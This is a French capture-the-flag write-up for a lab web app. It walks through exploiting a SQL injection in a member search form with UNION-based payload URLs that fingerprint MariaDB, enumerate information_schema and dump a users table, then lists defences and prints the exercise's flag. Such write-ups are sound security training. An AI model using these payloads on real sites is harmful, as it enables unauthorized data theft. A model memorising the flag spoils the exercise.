# Procédure GET THE IMAGE FLAG WITH SQL INJECTION

1. Repérer les points d'entrée vulnerables:   
    Formulaire recherche de membre [Formulaire](http://ip_darkly?page=member) `http://ip_darkly?page=member`
2. Récupérer l'empreinte du SGBD:   
    Détection par erreur + injection sql version() -> MariaDB
    ```
    ip_darkly/index.php?page=member&Submit=Submit&id=1 UNION SELECT 1, version() limit 1,1
    ```
3. Récupérer le nombres de colonnes max auquel l'injection SQL devra se référer:
   (n est le nombre à tester)
    ```
    ip_darkly/index.php?page=member&Submit=Submit&id=1 ORDER BY n
    ```
4. Récupérer le nom des tables accessibles à l'utilisateur
    ```
    ip_darkly/index.php?page=member&Submit=Submit&id=1 and 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
    ```
5. Récupérer le nom des colonnes qui nous interesse
    ```
    ip_darkly/index.php?page=member&Submit=Submit&id=1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
    ```
6. Injecter plusieur requetes SQL pour recuperer toutes les lignes de la table Member_Sql_Injection.users. La dernière colonne de chaque ligne recèle un message nous étant destiné et qu'il faut reconstituer. La dernière colonne de la dernière ligne contient le flag à décrypter depuis du md5 et à encoder en SHA256
    ``` shell
    ip_darkly/index.php?page=member&Submit=Submit&id=1 AND 1=2 UNION SELECT user_id, comment FROM Member_Sql_Injection.users
    ```

# Comment s'en prémunir

- Parser les inputs utilisateurs et échapper tout caractère spécial
- Répondre aux erreurs de SGBD avec des erreurs personnalisées en laissant peu
  d'indication sur l'erreur en cours afin de ne pas aiguiller un attaquant sur
  ce qui peut être vulnérable
- Utiliser les `parametrized query` offertes par les différents frameworks/API de
  développement (PDO...). NEVER TRUST INPUT USER. Ne jamais passer telle quelle une
  valeur récupérée d'une saisie utilisateur à une requête SQL.

## Pour plus d'informations:  
[WSTG-INPV-05](https://github.com/clallier94/wstg-translation-fr/blob/main/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md)   

## Flag
```text
fe0ca5dd7978ae1baae2c1c19d49fbfbb37fe7905b9ad386cbbb8206c8422de6
```
